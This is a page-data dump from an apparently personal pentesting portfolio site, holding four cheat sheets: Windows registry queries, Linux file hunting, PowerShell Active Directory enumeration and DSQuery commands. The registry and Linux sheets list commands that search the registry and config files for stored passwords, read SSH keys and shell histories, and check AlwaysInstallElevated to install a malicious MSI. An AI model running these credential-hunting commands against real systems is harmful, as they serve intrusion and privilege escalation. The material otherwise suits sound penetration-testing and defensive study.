{"componentChunkName":"component---src-templates-tags-template-js","path":"/tags/kde/","result":{"pageContext":{"posts":{"data":{"site":{"siteMetadata":{"title":"My Online Portfolio"}},"allMdx":{"nodes":[{"fields":{"slug":"/windows-registry"},"excerpt":"The Root Keys HKEY_CLASSES_ROOT (HKCR)HKEY_CURRENT_USER (HKCU)HKEY_LOCAL_MACHINE (HKLM)HKEY_USERS (HKU)HKEY_CURRENT_CONFIG (HKCC)\nQue…","frontmatter":{"date":"13th July 2022 ","title":"Windows Registry","description":"The Registry has been a part of Windows since Windows 3.1. Simply put, it's a database that stores Windows and programme settings. Some of those settings are quite complex and aren't meant for humans to alter or comprehend; others are simple and can be safely tweaked.","tags":"registry","posttype":"article"},"body":"\n# Registry\n\n### The Root Keys\n\n- HKEY_CLASSES_ROOT (HKCR)\n- HKEY_CURRENT_USER (HKCU)\n- HKEY_LOCAL_MACHINE (HKLM)\n- HKEY_USERS (HKU)\n- HKEY_CURRENT_CONFIG (HKCC)\n\n### Query Registry via Command Line\n\nList all\n\n```\nreg query <hive>\n```\n\nUse `/f` to search\n\n```\nreg query HKLM /f password\n```\n\nAdd `/s` to make the search recursive.\n\n```\nreg query HKLM  /s /f password\n```\n\nUse `/d` to only search in the data only.\n\n```\nreg query HKLM /d /s /f password\n```\n\n### Examples\n\nInstalled Programs\n\n```\nreg query HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall >> installed_programs.txt\n```\n\nRecursively loop through all registry keys.\n\n```\nreg query HKEY_LOCAL_MACHINE\\Software\\ \\s\n```\n\nServices\n\n```\nreg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ >> installed_services.txt\n```\n\nVNC Stored\n\n```\nreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"\nreg query \"HKCU\\Software\\ORL\\WinVNC4\\Password\"\n```\n\nWindows Autologin\n\n```\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"\n```\n\nSNMP Parameters\n\n```\nreg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"\n```\n\nRun-on Boot\n\n```\nreg query \"\\\\DC02\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\nreg query \"\\\\DC02\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nreg query \"\\\\DC02\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\"\n```\n\nVNC Password\n\n```\nreg query \"\\\\DC02\\HKLM\\SOFTWARE\\RealVNC\\WinVNC4 /v password\"\n```\n\nPutty Password\n\n```\nreg query \"\\\\DC02\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\n```\n\nPutty clear text proxy credentials:\n\n```\nreg query \"HKCU\\Software\\<user>\\PuTTY\\Sessions\"\n```\n\nCheck notification packages\n\n```\nreg query \"\\\\DC02\\HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Notification Packages\"\n```\n\nStarting with Windows 2000-based computers, the machine account password automatically changes every 30 days. Check if this has been disabled\n\n```\nreg query \"\\\\DC02\\HKLM\\System\\CurrentControlSet\\Services\\Netlogon\\Parameters\" /v \"DisablePasswordChange\"\n```\n\nSearch for passwords inside the registry\n\n```\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\nreg query HKLM /s | findstr /i password > temp.txt\nreg query HKCU /s | findstr /i password > temp.txt\n```\n\nCheck autologon\n\n```\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"\n```\n\nSNMP Settings\n\n```\nreg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"\n```\n\nIf BOTH registry values are set to 1, we can install a malicious MSI file.\n\n```\nreg query \"HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\" /v \"AlwaysInstallElevated\"\nreg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\" /v \"AlwaysInstallElevated\"\n```\n\nView the Name of the Domain Controller\n\n```\nreg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\" /v DCName\n```\n\nCheck Browser Proxy Settings\n\n```\nreg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\"\n```\n\nInternet Explorer History\n\n```\nreg query \"HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs\"\n```\n\nCheck physically attached hardware.\n\n```\nreg query \"HKLM\\System\\MountedDevices\"\n```\n\nCheck recent apps\n\n```\nreg query \"HKLM\\Microsoft\\Currentversion\\Search\\RecentApps\"\n```\n\nRemotely query the registry for the last logged in user.\n\n```\nreg query \"\\\\computername\\HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\WinLogon\"\n```\n\n### Terminal Server Service\n\nCheck if enabled\n\n```\nreg query \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\"\n```\n\nEnable remote desktop.\n\n```\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n```\n\nDisable remote assistance\n\n```\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f\n```\n\nThis setting enforces the deleting of Remote Desktop Services. Command checks if set.\n\n```\nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v \"DeleteTempDirsOnExit\"\n```"},{"fields":{"slug":"/find-interesting-files"},"excerpt":"Find SUID files find / -perm -4000 -type f 2>/dev/null\n\n\nFind SUID files owned by root\n\nfind / -uid 0 -perm -4000 -type f 2>/dev/null\n\n\nFind…","frontmatter":{"date":"29th June 2022 ","title":"Find Interesting Files","description":"A significant part of our job when searching around a target system is to look for interesting files.  Whether we have a need to look for SSH keys, Bash History files or database backups the commands typically all follow the same syntax. This article will look at using basic Linux commands to find and discover files.","tags":"enumeration, linux","posttype":"article"},"body":"\n# Finding Interesting Files\n\nFind SUID files\n\n```bash\nfind / -perm -4000 -type f 2>/dev/null\n```\n\nFind SUID files owned by root\n\n```bash\nfind / -uid 0 -perm -4000 -type f 2>/dev/null\n```\n\nFind GUID files\n\n```bash\nfind / -perm -2000 -type f 2>/dev/null\n```\n\nFind world-writeable files\n\n```bash\nfind / -perm -2 -type f 2>/dev/null\n```\n\nFind world-writeable files excluding those in /proc\n\n```bash\nfind / ! -path \"*/proc/*\" -perm -2 -type f -print 2>/dev/null\n```\n\nFind word-writeable directories\n\n```bash\nfind / -perm -2 -type d 2>/dev/null\n```\n\nFind rhost config files\n\n```bash\nfind /home –name *.rhosts -print 2>/dev/null\n```\n\nFind *.plan files, list permissions and cat the file contents\n\n```bash\nfind /home -iname *.plan -exec ls -la {} ; -exec cat {} 2>/dev/null ;\n```\n\nFind hosts.equiv, list permissions and cat the file contents\n\n```bash\nfind /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null ; -exec cat {} 2>/dev/null ;\n```\n\nSee if you can access other user directories to find interesting files\n\n```bash\nls -ahlR /root/\n```\n\nShow the current users’ command history\n\n```bash\ncat ~/.bash_history\n```\n\nShow the current users’ various history files\n\n```bash\nls -la ~/.*_history\n```\n\nCan we read root’s history files\n\n```bash\nls -la /root/.*_history\n```\n\nCheck for interesting ssh files in the current users’ directory\n\n```bash\nls -la ~/.ssh/\n```\n\nFind SSH keys/host information\n\n```bash\nfind / -name \"id_dsa*\" -o -name \"id_rsa*\" -o -name \"known_hosts\" -o -name \"authorized_hosts\" -o -name \"authorized_keys\" 2>/dev/null |xargs -r ls -la\n```\n\nCheck Configuration of inetd services\n\n```bash\nls -la /usr/sbin/in.*\n```\n\nCheck log files for keywords (‘pass’ in this example) and show positive matches\n\n```bash\ngrep -l -i pass /var/log/*.log 2>/dev/null\n```\n\nList files in specified directory (/var/log)\n\n```bash\nfind /var/log -type f -exec ls -la {} ; 2>/dev/null\n```\n\nList .log files in specified directory (/var/log)\n\n```bash\nfind /var/log -name *.log -type f -exec ls -la {} ; 2>/dev/null\n```\n\nList .conf files in /etc (recursive 1 level)\n\n```bash\nfind /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} ; 2>/dev/null\n```\n\nAs above\n\n```bash\nls -la /etc/*.conf\n```\n\nFind .conf files (recursive 4 levels) and output line number where the word ‘password’ is located\n\n```bash\nfind / -maxdepth 4 -name *.conf -type f -exec grep -Hn password {} ; 2>/dev/null\n```\n\nList open files (output will depend on account privileges)\n\n```bash\nlsof -i -n\n```\n\nCan we read roots mail\n\n```bash\nhead /var/mail/root\n```"},{"fields":{"slug":"/querying-active-directory-with-power-shell"},"excerpt":"PowerShell v1: .NET & ADSI PowerShell v2 & newer: PowerShell Active Directory Module\n\nImport-module servermanager; add-windowsfeature rsat…","frontmatter":{"date":"22nd June 2022 ","title":"Querying Active Directory With PowerShell","description":"Active Directory lies at the heart of most organisations' networks. PowerShell is a versatile Scripting Language that Windows natively support. We can leverage PowerShell to enumerate Active Directory for various pieces of information crucial to our penetration tests.","tags":"active-directory, enumeration, powershell","posttype":"article"},"body":"# Active Directory Querying With PowerShell\n\nPowerShell v1: .NET & ADSI\n\nPowerShell v2 & newer: PowerShell Active Directory Module\n\n```\nImport-module servermanager; add-windowsfeature rsat-ad-tools\nImport-module servermanager; add-windowsfeature rsat-ad-PowerShell\n```\n\n### .NET\n\nExample of .NET\n\n```\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers\n```\n\n### ADSI\n\n[http://www.selfadsi.org/extended-ad/search-domain-controllers.htm](http://www.selfadsi.org/extended-ad/search-domain-controllers.htm)\n\nExample of ADSI\n\n```\n$UserID = \"JoeUser\"\n$root = [ADSI]''\n$searcher = new-object System.DirectoryServices.DirectorySearcher($root)\n$searcher.filter = \"(&(objectClass=user)(sAMAccountName=$UserID))\"\n$user = $searcher.findall()\n$user\n```\n\n### Active Directory Module\n\nExample of Active Directory Module\n\n- Requires AD Web Services (ADWS) running on targeted DC (TCP 9389)\n    - (Side Note) PowerShell Remoting uses TCP 5985 (HTTP) or TCP 5986 (HTTPS)\n- SOAP XML messages over HTTP translated on DC\n\n```\nImport-Module ActiveDirectory\n$UserID = \"JoeUser\"\nGet-ADUser $UserID -Property *\n```\n\nHere are some of the more useful Active Directory Module commands\n\n```\nGet-Module -ListAvailable\nGet-Command -Module ActiveDirectory\n```\n\nServer 2008 R2\n\n```\nGet/Set-ADForest\nGet/Set-ADDomain\nGet/Set-ADDomainController\nGet/Set-ADUser\nGet/Set-ADComputer\nGet/Set-ADGroup\nGet/Set-ADGroupMember\nGet/Set-ADObject\nGet/Set-ADOrganizationalUnit\n\nEnable-ADOptionalFeature\nDisable/Enable-ADAccount\nMove-ADDirectoryServerOperationMasterRole\nNew-ADUser\nNew-ADComputer\nNew-ADGroup\nNew-ADObject\nNew-ADOrganizationalUnit\n```\n\nServer 2012+\n\n```\n*-ADResourcePropertyListMember\n*-ADAuthenticationPolicy\n*-ADAuthenticationPolicySilo\n*-ADCentralAccessPolicy\n*-ADCentralAccessRule\n*-ADResourceProperty\n*-ADResourcePropertyList\n*-ADResourcePropertyValueType\n*-ADDCCloneConfigFile\n*-ADReplicationAttributeMetadata\n*-ADReplicationConnection\n*-ADReplicationFailure\n*-ADReplicationPartnerMetadata\n*-ADReplicationQueueOperation\n*-ADReplicationSite\n*-ADReplicationSiteLink\n*-ADReplicationSiteLinkBridge\n*-ADReplicationSubnet\n*-ADReplicationUpToDatenessVectorTable\nSync-ADObject\n```\n\nA nice looking inventory of DC’s\n\n```\nGet-ADDomainController -Filter * | select hostname,IPv4Address,IsGlobalCatalog,IsReadOnly,OperatingSystem | Format-Table -auto\n```\n\n### Active Directory Drive\n\nExample of Active Directory drive\n\n```\nImort-Module ActiveDirectory\ndir ad:\nSet-Location ad:\nSet-Location \"dc=lab,dc=pentest,dc=local\"\ndir\n```\n\n### ANR\n\nANR enables you to find a user when you have some information about a user, but don’t know exactly to which attribute that data corresponds. For example, if you know the user has “Thor” somewhere, but don’t know exactly what the SAMAccountName is (or DN, SID, name, etc). Submitting an ANR search will query the AD attributes flagged for ANR (attributes must be indexed) and replies with the results (may be more than one user found).\n\nExample of ANR\n\n```\nImport-Module ActiveDirectory\nGet-ADObject -LDAPFilter {(&(ObjectClass=User)(ANR=Thor))}\n```\n\n## Active Directory Enumeration with .NET\n\nHere are some alternatives to using Get-ADForest & Get-Domain:\n\n### Get Active Directory Forest Information\n\n```\n$ADForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()\n$ADForestInfo.Name\n$ADForestInfo.Sites\n$ADForestInfo.Domains\n$ADForestInfo.GlobalCatalogs\n$ADForestInfo.ApplicationPartitions\n$ADForestInfo.ForestMode\n$ADForestInfo.RootDomain\n$ADForestInfo.Schema\n$ADForestInfo.SchemaRoleOwner\n$ADForestInfo.NamingRoleOwner\n```\n\nOR\n\n```\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Name\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Sites\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Domains\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GlobalCatalogs\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().ApplicationPartitions\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().ForestMode\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().RootDomain\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Schema\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().SchemaRoleOwner\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().NamingRoleOwner\n```\n\n### Get Active Directory Domain Information\n\nTarget the current (local) computer’s domain:\n\n```\n$ADDomainInfo = [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain()\n```\n\nTarget the current user’s domain:\n\n```\n$ADDomainName = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n```\n\n```\n$ADDomainInfo.Forest\n$ADDomainInfo.DomainControllers\n$ADDomainInfo.Children\n$ADDomainInfo.DomainMode\n$ADDomainInfo.Parent\n$ADDomainInfo.PdcRoleOwner\n$ADDomainInfo.RidRoleOwner\n$ADDomainInfo.Name\n```\n\nOR\n\n```\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Forest\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Children\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainMode\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Parent\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().RidRoleOwner\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name\n```\n\n- Note: Use `[System.DirectoryServices.ActiveDirectory.Domain]::GetCOMPUTERDomain().Attribute` for the local computer’s domain info.\n\nExample:\n\n```\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCOMPUTERDomain().Forest\n```\n\n### Get the local computer’s site information:\n\n```\n$LocalSiteInfo = [System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite()\n$LocalSiteInfo.Name\n$LocalSiteInfo.Domains\n$LocalSiteInfo.Subnets\n$LocalSiteInfo.Servers\n$LocalSiteInfo.AdjacentSites\n$LocalSiteInfo.SiteLinks\n$LocalSiteInfo.InterSiteTopologyGenerator\n$LocalSiteInfo.Options\n$LocalSiteInfo.Location\n$LocalSiteInfo.BridgeheadServers\n$LocalSiteInfo.PreferredSmtpBridgeheadServers\n$LocalSiteInfo.PreferredRpcBridgeheadServers\n$LocalSiteInfo.IntraSiteReplicationSchedule\n```\n\nOR\n\n```\n[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Name\n[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Domains\n[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Subnets\n[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Servers\n[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().AdjacentSites\n[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().SiteLinks\n[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().InterSiteTopologyGenerator\n[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Options\n[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Location\n[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().BridgeheadServers\n[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().PreferredSmtpBridgeheadServers\n[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().PreferredRpcBridgeheadServers\n[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().IntraSiteReplicationSchedule\n```\n\n## Sean Metcalf Fave Enumeration Commands\n\nGet a Computer’s Site:\n\n```\n[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite()\n```\n\nGet a User’s Domain:\n\n```\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name\n```\n\nGet a Computer’s Domain:\n\n```\n[System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().Name\n```\n\nList Active Directory FSMOs:\n\n```\n([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).SchemaRoleOwner\n([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).NamingRoleOwner\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).InfrastructureRoleOwner\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).PdcRoleOwner\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).RidRoleOwner\n```\n\nList All Domain Controllers in a Domain:\n\n```\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers\n```\n\nGet Active Directory Domain Mode:\n\n```\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainMode\n```\n\nGet Trusts for current Active Directory Domain:\n\n```\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\n```\n\nGet Active Directory Forest Name:\n\n```\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Name\n```\n\nGet a List of Sites in the Active Directory Forest:\n\n```\n[array] $ADSites = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Sites\n```\n\nGet Active Directory Forest Domains:\n\n```\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Domains\n```\n\nGet Active Directory Forest Global Catalogues:\n\n```\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GlobalCatalogs\n```\n\nGet Active Directory Forest Application Partitions:\n\n```\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().ApplicationPartitions\n```\n\nGet Active Directory Forest Mode:\n\n```\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().ForestMode\n```\n\nGet Active Directory Forest Root Domain:\n\n```\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().RootDomain\n```\n\nGet Active Directory Forest Schema DN:\n\n```\n[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Schema\n```\n\n## PowerShell Mitigations\n\nPowerShell version 5 will be out very soon and has several compelling security enhancements.\n\n### System-wide Transcripts\n\nUse group policy to have PowerShell log all system PowerShell commands and save the transcripts to a share for parsing.\n\n### Script Block Logging\n\nPowerShell logs the obfuscated code as well as the dynamically generated code that PowerShell actually executes.\n\n### Constrained PowerShell\n\nAutomatically enables PowerShell constrained mode when AppLocker policy is set to â€œAllowâ€. This limits PowerShell code execution to only core capability. The offensive PowerShell tools typically used by attackers leverage advanced PowerShell functionality disabled in Constrained Mode.\n\n### Windows 10 - Antimalware Integration\n\nWindows 10 adds Antimalware Integration which automatically passes all code PowerShell processes to an installed antimalware solution before execution. If the code is deemed as malicious it doesn’t execute. This also includes code downloaded into memory from the Internet and executed.\n\nPowerShell Security Recommendations.\n\n- Limit PowerShell Remoting (WinRM) - Limit WinRM listener scope to admin subnet & Disable PowerShell Remoting (WinRM) on DCs.\n- Audit/block PowerShell script execution via AppLocker. Once you have PowerShell v3+, Enable PowerShell Module logging (via GPO). This Enables tracking of PowerShell command usage providing capability to detect invoke-mimikatz use - just search PowerShell logs for “mimikatz”. [Note this won’t catch everything]\n- PowerShell v3+: Enable PowerShell Module logging (via GPO).\n- Leverage Metering for PowerShell usage trend analysis - JoeUser ran PowerShell on 10 computers today?\n- Track PowerShell Remoting Usage through NetFlow data OR check the PowerShell logs on clients (event ID 06) & servers (event id 400)\n- Deploy PowerShell v5 and implement system-wide transcripts"},{"fields":{"slug":"/ds-query"},"excerpt":"Open DS Query GUI Window rundll32 dsquery,OpenQueryWindow\n\nUsers\n\nQuery Users From Local server (default 100)\n\ndsquery user\n\n\nList Users…","frontmatter":{"date":"20th June 2022 ","title":"DSQuery","description":"Dsquery is a command-line tool that is built into Windows Server 2008. It is available if you have the Active Directory Domain Services (AD DS) server role installed. It allows you to find any objects in the directory using a Lightweight Directory Access Protocol (LDAP) query. To use it, you must run the dsquery command from an elevated command prompt.","tags":"dsquery, ldap","posttype":"article"},"body":"\n# DSQuery\n\nOpen DS Query GUI Window\n\n```\nrundll32 dsquery,OpenQueryWindow\n```\n\n### Users\n\nQuery Users From Local server (default 100)\n\n```\ndsquery user\n```\n\nList Users Remote Server (Unlimited or 2000 results)\n\n```\ndsquery user -s 10.100.1.254 -limit 0\ndsquery user -s 10.100.1.254 -limit 2000\n```\n\nQuery a specific user\n\n```\ndsquery user -samid <username> -s <DC IP Address>\ndsquery user -samid Administrator -s 10.100.1.254\n```\n\nList AD Users starting with ‘b’, don’t limit the number of results returned and request particular fields.\n\n```\ndsquery user -name \"b*\" -s 10.100.1.254 -limit 0 | dsget user -samid -sid -fn -ln -email -dept -disabled -reversiblepwd -mustchpwd -canchpwd -acctexpires -s 10.100.1.254\n```\n\nHow to Reset Active Directory User’s Password from Command Line\n```\ndsquery user -samid enter_username_here | dsmod user -pwd enter_new_pw_here -mustchpwd no\n```\n\nFind out if a user account is currently enabled or disabled.\n```\ndsquery user DC=%userdnsdomain:.=,DC=% -name %username% | dsget user -disabled -dn\n```\n\nStale user accounts\n```\ndsquery user domainroot -stalepwd 100 -limit 0\n```\n\nDisabled user accounts\n```\ndsquery user domainroot -disabled -limit 0\n```\n\nRemotely Reset the Active Directory User’s password from the command line.\n```\npsexec domain_controller_ip dsquery user -samid enter_username_here | dsmod user -pwd enter_new_pw_here -mustchpwd no enter_new_pw_here\n```\n\n### Computers\n\nList all computers\n```\ndsquery computer -limit 0\ndsquery computer -s 10.100.1.254\ndsquery computer -d marvel.lab\n```\n\nStale computer accounts\n\n```\ndsquery computer domainroot -stalepwd 180 -limit 0\n```\n\n### Loop through Domain Computers and run a command\n\nLoop through all the computers in the domain (Great for Adding Further Queries)\n\n```\nfor /f %i in ('dsquery computer -o rdn) do echo %i\n```\n\n### Group\n\nList all groups with Admin in the name\n\n```\ndsquery group -name \"*Admin*\" -s 10.100.1.254\ndsquery group -name \"*Admin*\" -s 10.100.1.254 | dsget group -members -expand -s 10.100.1.254\n```\n\nList all members of all group(s)\n\n```\ndsquery group -name \"*\" -s 10.100.1.254 | dsget group -members -expand -s 10.100.1.254\n```\n\nList all users in security group\n\n```\ndsquery group -name \"\" | dsget group -members -expand | dsget user -fn -ln -disabled\n```\n\n### Servers\n\nGet Domain Controllers\n\n```\ndsquery server -s 10.100.1.254\n```\n\nGlobal Catalog (`-isgc`)\n\n```\ndsquery server -isgc\n```\n\n### Loop through Domain servers and run a command\n\nLoop over a list of DC’s using `dsquery` (Great for Adding Further Queries)\n```\nfor /f %i in ('dsquery server -o rdn') do echo %i\n```\n\nDomain Controller IP Configuration\n```\nfor /f %i in ('dsquery server -domain %userdnsdomain% -o rdn') do psexec //%i ipconfig /all\n```\n\nAD Database disk usage\n```\nfor /f %i in ('dsquery server -domain %userdnsdomain% -o rdn') do dir //%i/admin$/ntds\n```\n\nDomain Controller Netlogon entries\n```\nfor /f %i in ('dsquery server -o rdn') do echo %i & reg query //%i/hklm/system/currentcontrolset/services/netlogon/parameters\n```\n\nDNS Zones in AD\n\n```\nfor /f %i in ('dsquery server -o rdn') do Dsquery * -s %i domainroot -filter (objectCategory=dnsZone)\n```\n\nEnumerate DNS Server Zones\n```\nfor /f %i in ('dsquery server -domain %userdnsdomain% -o rdn') do dnscmd %i /enumzones\n```\n\n### Sites\n\nReturn the object if KCC Intra/Inter site is disabled for each site\n```\ndsquery site | dsquery * -attr * -filter \"(|(Options:1.2.840.113556.1.4.803:=1)(Options:1.2.840.113556.1.4.803:=16))\"\n```\n\nReturn the object if KCC Intra/Inter site is disabled for each site\n```\ndsquery site | dsquery * -attr * -filter \"(|(Options:1.2.840.113556.1.4.803:=1)(Options:1.2.840.113556.1.4.803:=16))\"\n```\n\n### Subnets\n\nSubnet information\n```\ndsquery subnet -limit 0\n```\n\n### OU\n\nList Organisational Units\n```\ndsquery OU\n```\n\nACL on all OUs\n```\nfor /f \"delims=|\" %i in ('dsquery OU') do acldiag %i\n```\n\n### Custom Queries\n\nRemember all below queries can have the following added:\n\n- `s 10.100.1.254` will make the command query a remote server. `d marvel.lab` will make the command query a DC in the domain `limit 0` this option will allow ldap to return unlimited results as apposed to the default of 100 records. If 0 is given then the result set will be unlimited.\n\n### Servers\n\nFind servers in the domain\n```\ndsquery * domainroot -filter \"(&(objectCategory=Computer)(objectClass=Computer)(operatingSystem=*Server*))\"\n```\n\nDomain Controllers per site\n```\ndsquery * \"CN=Sites,CN=Configuration,DC=MARVEL,DC=LAB\" -filter \"(objectCategory=Server)\"\n```\n\nGlobal Catalog Servers from AD\n```\ndsquery * \"CN=Configuration,DC=MARVEL,DC=LAB\" -filter \"(&(objectCategory=nTDSDSA)(options:1.2.840.113556.1.4.803:=1))\"\n```\n\nDSQuery authorised DHCP Servers\n```\ndsquery * \"cn=NetServices,cn=Services,cn=Configuration,DC=MARVEL,DC=LAB\" -attr dhcpServers\n```\n\n### Users\n\nExport all usernames and email addresses\n```\ndsquery * -filter \"(&(objectCategory=person)(objectClass=user)(mail=*))\" -attr sAMAccountName name mail\n```\n\nUser accounts that are not disabled\n```\ndsquery * -filter \"(&(objectCategory=Person)(objectClass=User)(!userAccountControl:1.2.840.113556.1.4.803:=2))\"\n```\n\nUser accounts that are disabled\n```\ndsquery * domainroot -filter \"(&(objectCategory=Person)(objectClass=User)(userAccountControl:1.2.840.113556.1.4.803:=2))\"\n```\n\nUsers with no logon script\n```\ndsquery * domainroot -filter \"(&(objectCategory=Person)(objectClass=User)(!scriptPath=*))\" -attr sAMAccountName sn givenName pwdLastSet distinguishedName\n```\n\nUser accounts with no password required\n```\ndsquery * domainroot -filter \"(&(objectCategory=Person)(objectClass=User)(userAccountControl:1.2.840.113556.1.4.803:=32))\"\n```\n\nUser accounts with no password expiry\n```\ndsquery * domainroot -filter \"(&(objectCategory=Person)(objectClass=User)(userAccountControl:1.2.840.113556.1.4.803:=65536))\"\n```\n\nFind user by account name.\n```\ndsquery * domainroot -filter \"(samAccountName=Black.Widow)\" -attr *\n```\n\nFind a user by their email address.\n```\ndsquery * domainroot -filter \"(&(objectClass=User) (mail=Black.Widow@marvel.lab))\" -attr *\n```\n\nFind users with passwords set never to expire.\n```\ndsquery * domainroot -filter \"(&(objectClass=User) (userAccountControl>=65536))\" -attr samAccountName userPrincipalName userAccountControl\n```\n\n### Groups\n\nFind users in Domain Admin Group.\n```\ndsquery * -filter \"&(objectCategory=group)(CN=Domain Admins)\" | dsget group -members | dsget user -dn -samid -sid -fn -ln -display -email\n```\n\nFind empty groups.\n```\ndsquery * -filter \"&(objectCategory=group)(!member=*)\" -limit 0 -attr whenCreated whenChanged groupType sAMAccountName distinguishedName memberOf\n```\n\n### Group Policies\n\nInformation on existing GPOs\n```\ndsquery * \"CN=Policies,CN=System,DC=MARVEL,DC=LAB\" -filter \"(objectCategory=groupPolicyContainer)\" -attr displayName cnwhenCreated gPCFileSysPath\n```\n\nFind the policy display name given the GUID.\n```\ndsquery * \"CN=Policies,CN=System,DC=MARVEL,DC=LAB\" -filter \"(objectCategory=groupPolicyContainer)\" -attr Name displayName\n```\n\n### Useful Information\n\nForest/Domain Functional Levels\n\n```\ndsquery * \"cn=partitions,cn=configuration,DC=MARVEL,DC=LAB\" -filter \"(|(systemFlags=3)(systemFlags=-2147483648))\" -attr msDS-Behavior-Version Name dnsroot ntmixeddomain NetBIOSName\n```\n\nFind when the AD was installed.\n```\ndsquery * \"CN=configuration,DC=MARVEL,DC=LAB\" -attr whencreated -scope base\n```\n\nReturn the AD Schema\n\n```\ndsquery * \"CN=schema,CN=configuration,DC=MARVEL,DC=LAB\" -scope base -attr whenCreated whenChanged objectVersion\n```\n\n| 13 | Windows 2000 Server operating system 